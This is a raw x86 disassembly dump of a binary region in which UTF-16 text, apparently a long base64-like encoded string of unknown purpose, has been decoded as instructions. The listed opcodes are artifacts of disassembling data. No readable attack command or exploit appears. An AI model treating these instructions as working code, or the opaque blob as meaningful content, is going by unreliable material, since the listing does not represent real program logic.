  40a3f5:	59                   	pop    %ecx
  40a3f6:	4f                   	dec    %edi
  40a3f7:	00 72 00             	add    %dh,0x0(%edx)
  40a3fa:	33 00                	xor    (%eax),%eax
  40a3fc:	77 00                	ja     0x40a3fe
  40a3fe:	39 00                	cmp    %eax,(%eax)
  40a400:	74 00                	je     0x40a402
  40a402:	79 00                	jns    0x40a404
  40a404:	69 00 77 00 76 00    	imul   $0x760077,(%eax),%eax
  40a40a:	6c                   	insb   (%dx),%es:(%edi)
  40a40b:	00 4d 00             	add    %cl,0x0(%ebp)
  40a40e:	4e                   	dec    %esi
  40a40f:	00 4f 00             	add    %cl,0x0(%edi)
  40a412:	33 00                	xor    (%eax),%eax
  40a414:	4d                   	dec    %ebp
  40a415:	00 49 00             	add    %cl,0x0(%ecx)
  40a418:	47                   	inc    %edi
  40a419:	00 79 00             	add    %bh,0x0(%ecx)
  40a41c:	43                   	inc    %ebx
  40a41d:	00 35 00 46 00 44    	add    %dh,0x44004600
  40a423:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a426:	71 00                	jno    0x40a428
  40a428:	32 00                	xor    (%eax),%al
  40a42a:	6a 00                	push   $0x0
  40a42c:	58                   	pop    %eax
  40a42d:	00 62 00             	add    %ah,0x0(%edx)
  40a430:	6e                   	outsb  %ds:(%esi),(%dx)
  40a431:	00 61 00             	add    %ah,0x0(%ecx)
  40a434:	6a 00                	push   $0x0
  40a436:	75 00                	jne    0x40a438
  40a438:	6c                   	insb   (%dx),%es:(%edi)
  40a439:	00 76 00             	add    %dh,0x0(%esi)
  40a43c:	45                   	inc    %ebp
  40a43d:	00 4a 00             	add    %cl,0x0(%edx)
  40a440:	48                   	dec    %eax
  40a441:	00 62 00             	add    %ah,0x0(%edx)
  40a444:	6d                   	insl   (%dx),%es:(%edi)
  40a445:	00 30                	add    %dh,(%eax)
  40a447:	00 6b 00             	add    %ch,0x0(%ebx)
  40a44a:	50                   	push   %eax
  40a44b:	00 76 00             	add    %dh,0x0(%esi)
  40a44e:	33 00                	xor    (%eax),%eax
  40a450:	47                   	inc    %edi
  40a451:	00 62 00             	add    %ah,0x0(%edx)
  40a454:	4e                   	dec    %esi
  40a455:	00 67 00             	add    %ah,0x0(%edi)
  40a458:	6a 00                	push   $0x0
  40a45a:	55                   	push   %ebp
  40a45b:	00 79 00             	add    %bh,0x0(%ecx)
  40a45e:	77 00                	ja     0x40a460
  40a460:	39 00                	cmp    %eax,(%eax)
  40a462:	4f                   	dec    %edi
  40a463:	00 53 00             	add    %dl,0x0(%ebx)
  40a466:	35 00 74 00 37       	xor    $0x37007400,%eax
  40a46b:	00 47 00             	add    %al,0x0(%edi)
  40a46e:	38 00                	cmp    %al,(%eax)
  40a470:	49                   	dec    %ecx
  40a471:	00 39                	add    %bh,(%ecx)
  40a473:	00 6e 00             	add    %ch,0x0(%esi)
  40a476:	57                   	push   %edi
  40a477:	00 51 00             	add    %dl,0x0(%ecx)
  40a47a:	35 00 72 00 7a       	xor    $0x7a007200,%eax
  40a47f:	00 66 00             	add    %ah,0x0(%esi)
  40a482:	32 00                	xor    (%eax),%al
  40a484:	70 00                	jo     0x40a486
  40a486:	47                   	inc    %edi
  40a487:	00 63 00             	add    %ah,0x0(%ebx)
  40a48a:	37                   	aaa
  40a48b:	00 49 00             	add    %cl,0x0(%ecx)
  40a48e:	70 00                	jo     0x40a490
  40a490:	6b 00 69             	imul   $0x69,(%eax),%eax
  40a493:	00 53 00             	add    %dl,0x0(%ebx)
  40a496:	67 00 6e 00          	add    %ch,0x0(%bp)
  40a49a:	41                   	inc    %ecx
  40a49b:	00 42 00             	add    %al,0x0(%edx)
  40a49e:	73 00                	jae    0x40a4a0
  40a4a0:	7a 00                	jp     0x40a4a2
  40a4a2:	61                   	popa
  40a4a3:	00 30                	add    %dh,(%eax)
  40a4a5:	00 49 00             	add    %cl,0x0(%ecx)
  40a4a8:	54                   	push   %esp
  40a4a9:	00 78 00             	add    %bh,0x0(%eax)
  40a4ac:	33 00                	xor    (%eax),%eax
  40a4ae:	57                   	push   %edi
  40a4af:	00 65 00             	add    %ah,0x0(%ebp)
  40a4b2:	56                   	push   %esi
  40a4b3:	00 32                	add    %dh,(%edx)
  40a4b5:	00 6b 00             	add    %ch,0x0(%ebx)
  40a4b8:	47                   	inc    %edi
  40a4b9:	00 6d 00             	add    %ch,0x0(%ebp)
  40a4bc:	69 00 66 00 43 00    	imul   $0x430066,(%eax),%eax
  40a4c2:	4a                   	dec    %edx
  40a4c3:	00 30                	add    %dh,(%eax)
  40a4c5:	00 4a 00             	add    %cl,0x0(%edx)
  40a4c8:	38 00                	cmp    %al,(%eax)
  40a4ca:	36 00 31             	add    %dh,%ss:(%ecx)
  40a4cd:	00 4f 00             	add    %cl,0x0(%edi)
  40a4d0:	71 00                	jno    0x40a4d2
  40a4d2:	50                   	push   %eax
  40a4d3:	00 48 00             	add    %cl,0x0(%eax)
  40a4d6:	51                   	push   %ecx
  40a4d7:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
  40a4db:	00 65 00             	add    %ah,0x0(%ebp)
  40a4de:	45                   	inc    %ebp
  40a4df:	00 35 00 77 00 52    	add    %dh,0x52007700
  40a4e5:	00 6c 00 36          	add    %ch,0x36(%eax,%eax,1)
  40a4e9:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a4ec:	65 00 79 00          	add    %bh,%gs:0x0(%ecx)
  40a4f0:	6f                   	outsl  %ds:(%esi),(%dx)
  40a4f1:	00 53 00             	add    %dl,0x0(%ebx)
  40a4f4:	77 00                	ja     0x40a4f6
  40a4f6:	44                   	inc    %esp
  40a4f7:	00 47 00             	add    %al,0x0(%edi)
  40a4fa:	73 00                	jae    0x40a4fc
  40a4fc:	39 00                	cmp    %eax,(%eax)
  40a4fe:	47                   	inc    %edi
  40a4ff:	00 6d 00             	add    %ch,0x0(%ebp)
  40a502:	34 00                	xor    $0x0,%al
  40a504:	6e                   	outsb  %ds:(%esi),(%dx)
  40a505:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a508:	36 00 4b 00          	add    %cl,%ss:0x0(%ebx)
  40a50c:	4f                   	dec    %edi
  40a50d:	00 54 00 55          	add    %dl,0x55(%eax,%eax,1)
  40a511:	00 62 00             	add    %ah,0x0(%edx)
  40a514:	45                   	inc    %ebp
  40a515:	00 79 00             	add    %bh,0x0(%ecx)
  40a518:	44                   	inc    %esp
  40a519:	00 77 00             	add    %dh,0x0(%edi)
  40a51c:	66 00 6c 00 73       	data16 add %ch,0x73(%eax,%eax,1)
  40a521:	00 31                	add    %dh,(%ecx)
  40a523:	00 2f                	add    %ch,(%edi)
  40a525:	00 79 00             	add    %bh,0x0(%ecx)
  40a528:	38 00                	cmp    %al,(%eax)
  40a52a:	61                   	popa
  40a52b:	00 46 00             	add    %al,0x0(%esi)
  40a52e:	34 00                	xor    $0x0,%al
  40a530:	34 00                	xor    $0x0,%al
  40a532:	2f                   	das
  40a533:	00 57 00             	add    %dl,0x0(%edi)
  40a536:	51                   	push   %ecx
  40a537:	00 31                	add    %dh,(%ecx)
  40a539:	00 4f 00             	add    %cl,0x0(%edi)
  40a53c:	44                   	inc    %esp
  40a53d:	00 74 00 70          	add    %dh,0x70(%eax,%eax,1)
  40a541:	00 4c 00 46          	add    %cl,0x46(%eax,%eax,1)
  40a545:	00 41 00             	add    %al,0x0(%ecx)
  40a548:	59                   	pop    %ecx
  40a549:	00 2b                	add    %ch,(%ebx)
  40a54b:	00 64 00 61          	add    %ah,0x61(%eax,%eax,1)
  40a54f:	00 55 00             	add    %dl,0x0(%ebp)
  40a552:	6f                   	outsl  %ds:(%esi),(%dx)
  40a553:	00 48 00             	add    %cl,0x0(%eax)
  40a556:	32 00                	xor    (%eax),%al
  40a558:	4d                   	dec    %ebp
  40a559:	00 4d 00             	add    %cl,0x0(%ebp)
  40a55c:	73 00                	jae    0x40a55e
  40a55e:	57                   	push   %edi
  40a55f:	00 33                	add    %dh,(%ebx)
  40a561:	00 6b 00             	add    %ch,0x0(%ebx)
  40a564:	79 00                	jns    0x40a566
  40a566:	46                   	inc    %esi
  40a567:	00 37                	add    %dh,(%edi)
  40a569:	00 77 00             	add    %dh,0x0(%edi)
  40a56c:	70 00                	jo     0x40a56e
  40a56e:	69 00 71 00 36 00    	imul   $0x360071,(%eax),%eax
  40a574:	33 00                	xor    (%eax),%eax
  40a576:	54                   	push   %esp
  40a577:	00 4a 00             	add    %cl,0x0(%edx)
  40a57a:	70 00                	jo     0x40a57c
  40a57c:	45                   	inc    %ebp
  40a57d:	00 61 00             	add    %ah,0x0(%ecx)
  40a580:	71 00                	jno    0x40a582
  40a582:	73 00                	jae    0x40a584
  40a584:	33 00                	xor    (%eax),%eax
  40a586:	73 00                	jae    0x40a588
  40a588:	6e                   	outsb  %ds:(%esi),(%dx)
  40a589:	00 59 00             	add    %bl,0x0(%ecx)
  40a58c:	43                   	inc    %ebx
  40a58d:	00 48 00             	add    %cl,0x0(%eax)
  40a590:	6f                   	outsl  %ds:(%esi),(%dx)
  40a591:	00 54 00 65          	add    %dl,0x65(%eax,%eax,1)
  40a595:	00 73 00             	add    %dh,0x0(%ebx)
  40a598:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40a59c:	54                   	push   %esp
  40a59d:	00 69 00             	add    %ch,0x0(%ecx)
  40a5a0:	69 00 34 00 69 00    	imul   $0x690034,(%eax),%eax
  40a5a6:	6d                   	insl   (%dx),%es:(%edi)
  40a5a7:	00 51 00             	add    %dl,0x0(%ecx)
  40a5aa:	4c                   	dec    %esp
  40a5ab:	00 4c 00 43          	add    %cl,0x43(%eax,%eax,1)
  40a5af:	00 49 00             	add    %cl,0x0(%ecx)
  40a5b2:	42                   	inc    %edx
  40a5b3:	00 35 00 51 00 6d    	add    %dh,0x6d005100
  40a5b9:	00 46 00             	add    %al,0x0(%esi)
  40a5bc:	33 00                	xor    (%eax),%eax
  40a5be:	53                   	push   %ebx
  40a5bf:	00 68 00             	add    %ch,0x0(%eax)
  40a5c2:	2b 00                	sub    (%eax),%eax
  40a5c4:	63 00                	arpl   %eax,(%eax)
  40a5c6:	34 00                	xor    $0x0,%al
  40a5c8:	6d                   	insl   (%dx),%es:(%edi)
  40a5c9:	00 2b                	add    %ch,(%ebx)
  40a5cb:	00 73 00             	add    %dh,0x0(%ebx)
  40a5ce:	53                   	push   %ebx
  40a5cf:	00 78 00             	add    %bh,0x0(%eax)
  40a5d2:	45                   	inc    %ebp
  40a5d3:	00 73 00             	add    %dh,0x0(%ebx)
  40a5d6:	43                   	inc    %ebx
  40a5d7:	00 73 00             	add    %dh,0x0(%ebx)
  40a5da:	72 00                	jb     0x40a5dc
  40a5dc:	6f                   	outsl  %ds:(%esi),(%dx)
  40a5dd:	00 30                	add    %dh,(%eax)
  40a5df:	00 7a 00             	add    %bh,0x0(%edx)
  40a5e2:	64 00 56 00          	add    %dl,%fs:0x0(%esi)
  40a5e6:	6f                   	outsl  %ds:(%esi),(%dx)
  40a5e7:	00 58 00             	add    %bl,0x0(%eax)
  40a5ea:	73 00                	jae    0x40a5ec
  40a5ec:	31 00                	xor    %eax,(%eax)
  40a5ee:	71 00                	jno    0x40a5f0
  40a5f0:	57                   	push   %edi
  40a5f1:	00 5a 00             	add    %bl,0x0(%edx)
  40a5f4:	48                   	dec    %eax
  40a5f5:	00 43 00             	add    %al,0x0(%ebx)
  40a5f8:	43                   	inc    %ebx
  40a5f9:	00 43 00             	add    %al,0x0(%ebx)
  40a5fc:	2f                   	das
  40a5fd:	00 64 00 50          	add    %ah,0x50(%eax,%eax,1)
  40a601:	00 58 00             	add    %bl,0x0(%eax)
  40a604:	48                   	dec    %eax
  40a605:	00 65 00             	add    %ah,0x0(%ebp)
  40a608:	2b 00                	sub    (%eax),%eax
  40a60a:	31 00                	xor    %eax,(%eax)
  40a60c:	34 00                	xor    $0x0,%al
  40a60e:	58                   	pop    %eax
  40a60f:	00 56 00             	add    %dl,0x0(%esi)
  40a612:	54                   	push   %esp
  40a613:	00 78 00             	add    %bh,0x0(%eax)
  40a616:	74 00                	je     0x40a618
  40a618:	58                   	pop    %eax
  40a619:	00 47 00             	add    %al,0x0(%edi)
  40a61c:	4a                   	dec    %edx
  40a61d:	00 4a 00             	add    %cl,0x0(%edx)
  40a620:	53                   	push   %ebx
  40a621:	00 63 00             	add    %ah,0x0(%ebx)
  40a624:	45                   	inc    %ebp
  40a625:	00 61 00             	add    %ah,0x0(%ecx)
  40a628:	32 00                	xor    (%eax),%al
  40a62a:	61                   	popa
  40a62b:	00 75 00             	add    %dh,0x0(%ebp)
  40a62e:	64 00 78 00          	add    %bh,%fs:0x0(%eax)
  40a632:	2f                   	das
  40a633:	00 2b                	add    %ch,(%ebx)
  40a635:	00 41 00             	add    %al,0x0(%ecx)
  40a638:	34 00                	xor    $0x0,%al
  40a63a:	74 00                	je     0x40a63c
  40a63c:	44                   	inc    %esp
  40a63d:	00 56 00             	add    %dl,0x0(%esi)
  40a640:	78 00                	js     0x40a642
  40a642:	34 00                	xor    $0x0,%al
  40a644:	7a 00                	jp     0x40a646
  40a646:	39 00                	cmp    %eax,(%eax)
  40a648:	6d                   	insl   (%dx),%es:(%edi)
  40a649:	00 78 00             	add    %bh,0x0(%eax)
  40a64c:	33 00                	xor    (%eax),%eax
  40a64e:	46                   	inc    %esi
  40a64f:	00 4b 00             	add    %cl,0x0(%ebx)
  40a652:	4c                   	dec    %esp
  40a653:	00 6f 00             	add    %ch,0x0(%edi)
  40a656:	59                   	pop    %ecx
  40a657:	00 79 00             	add    %bh,0x0(%ecx)
  40a65a:	54                   	push   %esp
  40a65b:	00 4c 00 77          	add    %cl,0x77(%eax,%eax,1)
  40a65f:	00 52 00             	add    %dl,0x0(%edx)
  40a662:	4b                   	dec    %ebx
  40a663:	00 67 00             	add    %ah,0x0(%edi)
  40a666:	6f                   	outsl  %ds:(%esi),(%dx)
  40a667:	00 67 00             	add    %ah,0x0(%edi)
  40a66a:	31 00                	xor    %eax,(%eax)
  40a66c:	6e                   	outsb  %ds:(%esi),(%dx)
  40a66d:	00 65 00             	add    %ah,0x0(%ebp)
  40a670:	66 00 2b             	data16 add %ch,(%ebx)
  40a673:	00 61 00             	add    %ah,0x0(%ecx)
  40a676:	4c                   	dec    %esp
  40a677:	00 72 00             	add    %dh,0x0(%edx)
  40a67a:	7a 00                	jp     0x40a67c
  40a67c:	49                   	dec    %ecx
  40a67d:	00 5a 00             	add    %bl,0x0(%edx)
  40a680:	61                   	popa
  40a681:	00 66 00             	add    %ah,0x0(%esi)
  40a684:	51                   	push   %ecx
  40a685:	00 6b 00             	add    %ch,0x0(%ebx)
  40a688:	62 00                	bound  %eax,(%eax)
  40a68a:	38 00                	cmp    %al,(%eax)
  40a68c:	7a 00                	jp     0x40a68e
  40a68e:	32 00                	xor    (%eax),%al
  40a690:	47                   	inc    %edi
  40a691:	00 75 00             	add    %dh,0x0(%ebp)
  40a694:	45                   	inc    %ebp
  40a695:	00 2f                	add    %ch,(%edi)
  40a697:	00 7a 00             	add    %bh,0x0(%edx)
  40a69a:	42                   	inc    %edx
  40a69b:	00 56 00             	add    %dl,0x0(%esi)
  40a69e:	6e                   	outsb  %ds:(%esi),(%dx)
  40a69f:	00 4f 00             	add    %cl,0x0(%edi)
  40a6a2:	35 00 37 00 79       	xor    $0x79003700,%eax
  40a6a7:	00 45 00             	add    %al,0x0(%ebp)
  40a6aa:	2b 00                	sub    (%eax),%eax
  40a6ac:	4a                   	dec    %edx
  40a6ad:	00 48 00             	add    %cl,0x0(%eax)
  40a6b0:	55                   	push   %ebp
  40a6b1:	00 7a 00             	add    %bh,0x0(%edx)
  40a6b4:	2b 00                	sub    (%eax),%eax
  40a6b6:	70 00                	jo     0x40a6b8
  40a6b8:	34 00                	xor    $0x0,%al
  40a6ba:	35 00 53 00 6d       	xor    $0x6d005300,%eax
  40a6bf:	00 78 00             	add    %bh,0x0(%eax)
  40a6c2:	4c                   	dec    %esp
  40a6c3:	00 71 00             	add    %dh,0x0(%ecx)
  40a6c6:	58                   	pop    %eax
  40a6c7:	00 37                	add    %dh,(%edi)
  40a6c9:	00 32                	add    %dh,(%edx)
  40a6cb:	00 43 00             	add    %al,0x0(%ebx)
  40a6ce:	33 00                	xor    (%eax),%eax
  40a6d0:	6b 00 51             	imul   $0x51,(%eax),%eax
  40a6d3:	00 2b                	add    %ch,(%ebx)
  40a6d5:	00 44 00 75          	add    %al,0x75(%eax,%eax,1)
  40a6d9:	00 66 00             	add    %ah,0x0(%esi)
  40a6dc:	38 00                	cmp    %al,(%eax)
  40a6de:	6a 00                	push   $0x0
  40a6e0:	76 00                	jbe    0x40a6e2
  40a6e2:	6b 00 45             	imul   $0x45,(%eax),%eax
  40a6e5:	00 30                	add    %dh,(%eax)
  40a6e7:	00 71 00             	add    %dh,0x0(%ecx)
  40a6ea:	49                   	dec    %ecx
  40a6eb:	00 61 00             	add    %ah,0x0(%ecx)
  40a6ee:	72 00                	jb     0x40a6f0
  40a6f0:	74 00                	je     0x40a6f2
  40a6f2:	2f                   	das
  40a6f3:	00 79 00             	add    %bh,0x0(%ecx)
  40a6f6:	2f                   	das
  40a6f7:	00 4f 00             	add    %cl,0x0(%edi)
  40a6fa:	66 00 66 00          	data16 add %ah,0x0(%esi)
  40a6fe:	39 00                	cmp    %eax,(%eax)
  40a700:	2b 00                	sub    (%eax),%eax
  40a702:	36 00 42 00          	add    %al,%ss:0x0(%edx)
  40a706:	6d                   	insl   (%dx),%es:(%edi)
  40a707:	00 30                	add    %dh,(%eax)
  40a709:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a70c:	32 00                	xor    (%eax),%al
  40a70e:	58                   	pop    %eax
  40a70f:	00 74 00 71          	add    %dh,0x71(%eax,%eax,1)
  40a713:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a716:	62 00                	bound  %eax,(%eax)
  40a718:	63 00                	arpl   %eax,(%eax)
  40a71a:	73 00                	jae    0x40a71c
  40a71c:	62 00                	bound  %eax,(%eax)
  40a71e:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40a722:	45                   	inc    %ebp
  40a723:	00 2b                	add    %ch,(%ebx)
  40a725:	00 6d 00             	add    %ch,0x0(%ebp)
  40a728:	73 00                	jae    0x40a72a
  40a72a:	38 00                	cmp    %al,(%eax)
  40a72c:	62 00                	bound  %eax,(%eax)
  40a72e:	52                   	push   %edx
  40a72f:	00 45 00             	add    %al,0x0(%ebp)
  40a732:	49                   	dec    %ecx
  40a733:	00 4d 00             	add    %cl,0x0(%ebp)
  40a736:	47                   	inc    %edi
  40a737:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a73a:	39 00                	cmp    %eax,(%eax)
  40a73c:	6e                   	outsb  %ds:(%esi),(%dx)
  40a73d:	00 37                	add    %dh,(%edi)
  40a73f:	00 79 00             	add    %bh,0x0(%ecx)
  40a742:	4a                   	dec    %edx
  40a743:	00 51 00             	add    %dl,0x0(%ecx)
  40a746:	64 00 2b             	add    %ch,%fs:(%ebx)
  40a749:	00 4b 00             	add    %cl,0x0(%ebx)
  40a74c:	34 00                	xor    $0x0,%al
  40a74e:	63 00                	arpl   %eax,(%eax)
  40a750:	37                   	aaa
  40a751:	00 70 00             	add    %dh,0x0(%eax)
  40a754:	39 00                	cmp    %eax,(%eax)
  40a756:	62 00                	bound  %eax,(%eax)
  40a758:	57                   	push   %edi
  40a759:	00 4b 00             	add    %cl,0x0(%ebx)
  40a75c:	75 00                	jne    0x40a75e
  40a75e:	31 00                	xor    %eax,(%eax)
  40a760:	66 00 57 00          	data16 add %dl,0x0(%edi)
  40a764:	66 00 73 00          	data16 add %dh,0x0(%ebx)
  40a768:	49                   	dec    %ecx
  40a769:	00 70 00             	add    %dh,0x0(%eax)
  40a76c:	30 00                	xor    %al,(%eax)
  40a76e:	44                   	inc    %esp
  40a76f:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a772:	33 00                	xor    (%eax),%eax
  40a774:	76 00                	jbe    0x40a776
  40a776:	51                   	push   %ecx
  40a777:	00 46 00             	add    %al,0x0(%esi)
  40a77a:	59                   	pop    %ecx
  40a77b:	00 37                	add    %dh,(%edi)
  40a77d:	00 45 00             	add    %al,0x0(%ebp)
  40a780:	35 00 39 00 69       	xor    $0x69003900,%eax
  40a785:	00 45 00             	add    %al,0x0(%ebp)
  40a788:	35 00 49 00 73       	xor    $0x73004900,%eax
  40a78d:	00 32                	add    %dh,(%edx)
  40a78f:	00 4a 00             	add    %cl,0x0(%edx)
  40a792:	66 00 57 00          	data16 add %dl,0x0(%edi)
  40a796:	45                   	inc    %ebp
  40a797:	00 58 00             	add    %bl,0x0(%eax)
  40a79a:	73 00                	jae    0x40a79c
  40a79c:	34 00                	xor    $0x0,%al
  40a79e:	48                   	dec    %eax
  40a79f:	00 76 00             	add    %dh,0x0(%esi)
  40a7a2:	61                   	popa
  40a7a3:	00 35 00 55 00 72    	add    %dh,0x72005500
  40a7a9:	00 32                	add    %dh,(%edx)
  40a7ab:	00 6c 00 79          	add    %ch,0x79(%eax,%eax,1)
  40a7af:	00 41 00             	add    %al,0x0(%ecx)
  40a7b2:	58                   	pop    %eax
  40a7b3:	00 79 00             	add    %bh,0x0(%ecx)
  40a7b6:	4f                   	dec    %edi
  40a7b7:	00 42 00             	add    %al,0x0(%edx)
  40a7ba:	69 00 2f 00 4b 00    	imul   $0x4b002f,(%eax),%eax
  40a7c0:	74 00                	je     0x40a7c2
  40a7c2:	78 00                	js     0x40a7c4
  40a7c4:	50                   	push   %eax
  40a7c5:	00 32                	add    %dh,(%edx)
  40a7c7:	00 4c 00 37          	add    %cl,0x37(%eax,%eax,1)
  40a7cb:	00 67 00             	add    %ah,0x0(%edi)
  40a7ce:	53                   	push   %ebx
  40a7cf:	00 39                	add    %bh,(%ecx)
  40a7d1:	00 2f                	add    %ch,(%edi)
  40a7d3:	00 71 00             	add    %dh,0x0(%ecx)
  40a7d6:	7a 00                	jp     0x40a7d8
  40a7d8:	68 00 76 00 77       	push   $0x77007600
  40a7dd:	00 78 00             	add    %bh,0x0(%eax)
  40a7e0:	7a 00                	jp     0x40a7e2
  40a7e2:	52                   	push   %edx
  40a7e3:	00 69 00             	add    %ch,0x0(%ecx)
  40a7e6:	6b 00 79             	imul   $0x79,(%eax),%eax
  40a7e9:	00 71 00             	add    %dh,0x0(%ecx)
  40a7ec:	78 00                	js     0x40a7ee
  40a7ee:	54                   	push   %esp
  40a7ef:	00 5a 00             	add    %bl,0x0(%edx)
  40a7f2:	78 00                	js     0x40a7f4
  40a7f4:	30 00                	xor    %al,(%eax)
  40a7f6:	45                   	inc    %ebp
  40a7f7:	00 55 00             	add    %dl,0x0(%ebp)
  40a7fa:	34 00                	xor    $0x0,%al
  40a7fc:	6b 00 68             	imul   $0x68,(%eax),%eax
  40a7ff:	00 32                	add    %dh,(%edx)
  40a801:	00 73 00             	add    %dh,0x0(%ebx)
  40a804:	2f                   	das
  40a805:	00 30                	add    %dh,(%eax)
  40a807:	00 57 00             	add    %dl,0x0(%edi)
  40a80a:	59                   	pop    %ecx
  40a80b:	00 35 00 48 00 37    	add    %dh,0x37004800
  40a811:	00 35 00 4c 00 69    	add    %dh,0x69004c00
  40a817:	00 2b                	add    %ch,(%ebx)
  40a819:	00 45 00             	add    %al,0x0(%ebp)
  40a81c:	4a                   	dec    %edx
  40a81d:	00 6f 00             	add    %ch,0x0(%edi)
  40a820:	5a                   	pop    %edx
  40a821:	00 72 00             	add    %dh,0x0(%edx)
  40a824:	79 00                	jns    0x40a826
  40a826:	30 00                	xor    %al,(%eax)
  40a828:	35 00 7a 00 61       	xor    $0x61007a00,%eax
  40a82d:	00 49 00             	add    %cl,0x0(%ecx)
  40a830:	61                   	popa
  40a831:	00 68 00             	add    %ch,0x0(%eax)
  40a834:	37                   	aaa
  40a835:	00 31                	add    %dh,(%ecx)
  40a837:	00 5a 00             	add    %bl,0x0(%edx)
  40a83a:	70 00                	jo     0x40a83c
  40a83c:	68 00 6d 00 74       	push   $0x74006d00
  40a841:	00 59 00             	add    %bl,0x0(%ecx)
  40a844:	55                   	push   %ebp
  40a845:	00 32                	add    %dh,(%edx)
  40a847:	00 6e 00             	add    %ch,0x0(%esi)
  40a84a:	33 00                	xor    (%eax),%eax
  40a84c:	61                   	popa
  40a84d:	00 35 00 53 00 4d    	add    %dh,0x4d005300
  40a853:	00 75 00             	add    %dh,0x0(%ebp)
  40a856:	7a 00                	jp     0x40a858
  40a858:	47                   	inc    %edi
  40a859:	00 6d 00             	add    %ch,0x0(%ebp)
  40a85c:	48                   	dec    %eax
  40a85d:	00 55 00             	add    %dl,0x0(%ebp)
  40a860:	48                   	dec    %eax
  40a861:	00 65 00             	add    %ah,0x0(%ebp)
  40a864:	36 00 68 00          	add    %ch,%ss:0x0(%eax)
  40a868:	49                   	dec    %ecx
  40a869:	00 45 00             	add    %al,0x0(%ebp)
  40a86c:	79 00                	jns    0x40a86e
  40a86e:	2f                   	das
  40a86f:	00 51 00             	add    %dl,0x0(%ecx)
  40a872:	46                   	inc    %esi
  40a873:	00 69 00             	add    %ch,0x0(%ecx)
  40a876:	47                   	inc    %edi
  40a877:	00 37                	add    %dh,(%edi)
  40a879:	00 4e 00             	add    %cl,0x0(%esi)
  40a87c:	49                   	dec    %ecx
  40a87d:	00 46 00             	add    %al,0x0(%esi)
  40a880:	30 00                	xor    %al,(%eax)
  40a882:	69 00 4b 00 32 00    	imul   $0x32004b,(%eax),%eax
  40a888:	6d                   	insl   (%dx),%es:(%edi)
  40a889:	00 4c 00 33          	add    %cl,0x33(%eax,%eax,1)
  40a88d:	00 4a 00             	add    %cl,0x0(%edx)
  40a890:	37                   	aaa
  40a891:	00 6f 00             	add    %ch,0x0(%edi)
  40a894:	41                   	inc    %ecx
  40a895:	00 63 00             	add    %ah,0x0(%ebx)
  40a898:	4b                   	dec    %ebx
  40a899:	00 36                	add    %dh,(%esi)
  40a89b:	00 79 00             	add    %bh,0x0(%ecx)
  40a89e:	72 00                	jb     0x40a8a0
  40a8a0:	6f                   	outsl  %ds:(%esi),(%dx)
  40a8a1:	00 79 00             	add    %bh,0x0(%ecx)
  40a8a4:	62 00                	bound  %eax,(%eax)
  40a8a6:	6a 00                	push   $0x0
  40a8a8:	52                   	push   %edx
  40a8a9:	00 74 00 43          	add    %dh,0x43(%eax,%eax,1)
  40a8ad:	00 59 00             	add    %bl,0x0(%ecx)
  40a8b0:	59                   	pop    %ecx
  40a8b1:	00 4a 00             	add    %cl,0x0(%edx)
  40a8b4:	38 00                	cmp    %al,(%eax)
  40a8b6:	70 00                	jo     0x40a8b8
  40a8b8:	59                   	pop    %ecx
  40a8b9:	00 37                	add    %dh,(%edi)
  40a8bb:	00 70 00             	add    %dh,0x0(%eax)
  40a8be:	42                   	inc    %edx
  40a8bf:	00 43 00             	add    %al,0x0(%ebx)
  40a8c2:	53                   	push   %ebx
  40a8c3:	00 79 00             	add    %bh,0x0(%ecx)
  40a8c6:	37                   	aaa
  40a8c7:	00 75 00             	add    %dh,0x0(%ebp)
  40a8ca:	63 00                	arpl   %eax,(%eax)
  40a8cc:	44                   	inc    %esp
  40a8cd:	00 4d 00             	add    %cl,0x0(%ebp)
  40a8d0:	65 00 6f 00          	add    %ch,%gs:0x0(%edi)
  40a8d4:	50                   	push   %eax
  40a8d5:	00 53 00             	add    %dl,0x0(%ebx)
  40a8d8:	4f                   	dec    %edi
  40a8d9:	00 55 00             	add    %dl,0x0(%ebp)
  40a8dc:	53                   	push   %ebx
  40a8dd:	00 2f                	add    %ch,(%edi)
  40a8df:	00 75 00             	add    %dh,0x0(%ebp)
  40a8e2:	4c                   	dec    %esp
  40a8e3:	00 57 00             	add    %dl,0x0(%edi)
  40a8e6:	30 00                	xor    %al,(%eax)
  40a8e8:	58                   	pop    %eax
  40a8e9:	00 4f 00             	add    %cl,0x0(%edi)
  40a8ec:	34 00                	xor    $0x0,%al
  40a8ee:	49                   	dec    %ecx
  40a8ef:	00 72 00             	add    %dh,0x0(%edx)
  40a8f2:	70 00                	jo     0x40a8f4
  40a8f4:	6a 00                	push   $0x0
  40a8f6:	32 00                	xor    (%eax),%al
  40a8f8:	4d                   	dec    %ebp
  40a8f9:	00 36                	add    %dh,(%esi)
  40a8fb:	00 76 00             	add    %dh,0x0(%esi)
  40a8fe:	71 00                	jno    0x40a900
  40a900:	51                   	push   %ecx
  40a901:	00 48 00             	add    %cl,0x0(%eax)
  40a904:	34 00                	xor    $0x0,%al
  40a906:	64 00 31             	add    %dh,%fs:(%ecx)
  40a909:	00 30                	add    %dh,(%eax)
  40a90b:	00 4f 00             	add    %cl,0x0(%edi)
  40a90e:	4a                   	dec    %edx
  40a90f:	00 65 00             	add    %ah,0x0(%ebp)
  40a912:	74 00                	je     0x40a914
  40a914:	74 00                	je     0x40a916
  40a916:	44                   	inc    %esp
  40a917:	00 57 00             	add    %dl,0x0(%edi)
  40a91a:	5a                   	pop    %edx
  40a91b:	00 74 00 62          	add    %dh,0x62(%eax,%eax,1)
  40a91f:	00 5a 00             	add    %bl,0x0(%edx)
  40a922:	51                   	push   %ecx
  40a923:	00 53 00             	add    %dl,0x0(%ebx)
  40a926:	4b                   	dec    %ebx
  40a927:	00 51 00             	add    %dl,0x0(%ecx)
  40a92a:	58                   	pop    %eax
  40a92b:	00 64 00 37          	add    %ah,0x37(%eax,%eax,1)
  40a92f:	00 67 00             	add    %ah,0x0(%edi)
  40a932:	54                   	push   %esp
  40a933:	00 6a 00             	add    %ch,0x0(%edx)
  40a936:	72 00                	jb     0x40a938
  40a938:	66 00 51 00          	data16 add %dl,0x0(%ecx)
